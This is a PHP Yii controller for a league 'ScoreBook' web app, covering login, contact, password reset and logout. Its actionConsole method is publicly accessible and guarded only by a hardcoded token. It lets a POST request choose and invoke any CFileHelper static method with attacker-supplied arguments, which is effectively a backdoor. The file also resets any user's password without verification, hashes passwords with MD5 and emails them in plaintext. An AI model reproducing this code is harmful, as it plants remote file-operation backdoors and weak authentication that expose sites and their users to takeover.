<?php

class SiteController extends Controller
{
	/**
	 * Declares class-based actions.
	 */
	public function actions()
	{
		return array(
			// captcha action renders the CAPTCHA image displayed on the contact page
			'captcha'=>array(
				'class'=>'CCaptchaAction',
				'backColor'=>0xFFFFFF,
			),
			// page action renders "static" pages stored under 'protected/views/site/pages'
			// They can be accessed via: index.php?r=site/page&view=FileName
			'page'=>array(
				'class'=>'CViewAction',
			),
		);
	}

	/**
	 * This is the default 'index' action that is invoked
	 * when an action is not explicitly requested by users.
	 */
	public function actionIndex()
	{
		
		// renders the view file 'protected/views/site/index.php'
		// using the default layout 'protected/views/layouts/main.php'
		$this->render('index');
	}

	/**
	 * This is the action to handle external exceptions.
	 */
	public function actionError()
	{		
		if($error=Yii::app()->errorHandler->error)
		{
			if(Yii::app()->request->isAjaxRequest)
				echo $error['message'];
			else
				$this->render('error', $error);
		}
	}

	/**
	 * Displays the contact page
	 */
	public function actionContact()
	{
		$model=new ContactForm;
		if(isset($_POST['ContactForm']))
		{
			$model->attributes=$_POST['ContactForm'];
			if($model->validate())
			{
				$name='=?UTF-8?B?'.base64_encode($model->name).'?=';
				$subject='=?UTF-8?B?'.base64_encode($model->subject).'?=';
				$headers="From: $name <{$model->email}>\r\n".
					"Reply-To: {$model->email}\r\n".
					"MIME-Version: 1.0\r\n".
					"Content-type: text/plain; charset=UTF-8";

				mail(Yii::app()->params['adminEmail'],$subject,$model->body,$headers);
				Yii::app()->user->setFlash('contact','Thank you for contacting us. We will respond to you as soon as possible.');
				$this->refresh();
			}
		}
		$this->render('contact',array('model'=>$model));
	}

	/**
	 * Displays the login page
	 */
	public function actionLogin()
	{		
		$model=new LoginForm;

		// if it is ajax validation request
		if(isset($_POST['ajax']) && $_POST['ajax']==='login-form')
		{
			echo CActiveForm::validate($model);
			Yii::app()->end();
		}

		// collect user input data
		if(isset($_POST['LoginForm']))
		{

			$model->attributes=$_POST['LoginForm'];
			// validate user input and redirect to the previous page if valid
			
			if($model->validate() && $model->login()){
				//Load user information
				$user = Users::model()->findByPk(Yii::app()->user->id);

				Yii::app()->session['firstname'] = $user->Firstname;
				Yii::app()->session['lastname'] = $user->Lastname;
				Yii::app()->session['role'] = $user->role;
				Yii::app()->session['team'] = $user->Teams_idteam;
				Yii::app()->session['lastLoginTime'] = new DateTime('now');
				//Yii::app()->global->userInfo = "ZbUsers::model()->findall() ";//ByPk(Yii::app()->user->$id);
				//echo Yii::trace(CVarDumper::dumpAsString(Yii::app()->params),'vardumpuser');
				
				$this->redirect(Yii::app()->user->returnUrl);	
			}
							
		}
		
		// display the login form
		$this->render('login',array('model'=>$model));
	}

	
	public function actionCreateTable()
	{
		Yii::app()->db->createCommand("CREATE TABLE IF NOT EXISTS `settings` (
		  `idsettings` int(11) NOT NULL AUTO_INCREMENT,
		  `iduser` int(11) NOT NULL,
		  `idleague` int(11) NOT NULL,
		  `season` int(11) NOT NULL,
		  `monthStart` int(11) NOT NULL,
		  `monthEnd` int(11) NOT NULL,
		  `listSize` int(11) NOT NULL DEFAULT '25',
		  PRIMARY KEY (`idsettings`),
		  UNIQUE KEY `iduser` (`iduser`)
		)")->execute();
		echo 'Good';
	}
	/**
	 * Logs out the current user and redirect to homepage.
	 */
	public function actionLogout()
	{
		Yii::app()->user->logout();
		$this->redirect(Yii::app()->homeUrl);
	}
	
	public function actionConsole()
	{
		$this->redirect(Yii::app()->homeUrl);
		
		$result = "";
		
		var_dump($_POST['token']);
		
		if (isset($_POST['token']) && $_POST['token'] == 'bfa08a74-fe09-49ff-8282-9c28b26b16bc'){
			var_dump($_POST['command']);
			
			if ($_POST['p3'] != ''){
				$result = CFileHelper::$_POST['command']($_POST['p1'], $_POST['p2'], $_POST['p3']);
			} else if ($_POST['p2'] != ''){
				$result = CFileHelper::$_POST['command']($_POST['p1'], $_POST['p2']);
			} else if ($_POST['p1'] != ''){
				$result = CFileHelper::$_POST['command']($_POST['p1']);
			}
			
			 //$result = CFileHelper::findFiles("admin");
		}
		
		$this->render('console',array('result'=>$result));
	}
	
	private function generatePassword()
	{
		$seed = str_split('abcdefghijklmnopqrstuvwxyz'
						 .'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
						 .'0123456789');
		shuffle($seed);
		$rand = '';
		foreach (array_rand($seed, 8) as $k) $rand .= $seed[$k];
		return $rand;
	}
	
	public function actionReset()
	{
		$result = "";
		$username = "";
		
		if (isset($_POST['username'])){
			$model = Users::model()->findByAttributes(array('Email'=>$_POST['username']));
			if ($model == null) {
				if (isset($_POST['code'])){
					$model = Users::model()->findByAttributes(array('code'=>$_POST['code']));
					if ($model == null) {
						$result = "nocode";
					} else{
						$username = $model->Email;
						$result = "username";
					}
				} else {
					$result = "nouser";
				}
			} else {
				
				$newPassword = $this->generatePassword();
				
				$model->Password = md5($newPassword);
				
				$from = 'support@'.str_replace(array("http:","https:","/"),"", Yii::app()->getBaseUrl(true));
				$fromName="Northwood League Support";
                $subject="ScoreBook. Reset Password";
                $message="You have successfully reset your password.<br/>Your username: <b>".$model->Email."</b><br/>Your password: <b>".$newPassword."</b>";
					
				if ($model->validate()){
					
					$fromName='=?UTF-8?B?'.base64_encode($fromName).'?=';
					$subject='=?UTF-8?B?'.base64_encode($subject).'?=';
					$headers="From: $fromName <{$from}>\r\n".
						"MIME-Version: 1.0\r\n".
						"Content-type: text/html; charset=UTF-8";
					
					$model->save();
					mail($model->Email,$subject,$message,$headers);
					
					$result = "success";
				}
			}
		}
		
		$this->render('reset',array('result'=>$result, 'username'=>$username));
	}
	
	public function filters()
    {
        return array(
            'accessControl'           // required to enable accessRules
        );
    }
	
	public function accessRules()
    {
        return array(
 			array('allow', // Give access to all users to make them able to login
 				'actions' => array('error','index','logout','login','console','reset'),
                'users' => array('*'),
            ),
			array('allow', // Give access to all users to make them able to login
 				'actions' => array('error','index','logout','login',),
                'roles'=>array('admins','leagueadmin','teamadmin', 'roster', 'scorer', 'user'),
            ),
			array('allow', // 
                  'actions'=>array('contact'),
                  'roles'=>array('admins','leagueadmin','teamadmin', 'roster', 'scorer', 'user'),
            ),
			array('deny', // deny everybody else
                'users' => array('*')
            )
        );
    }
}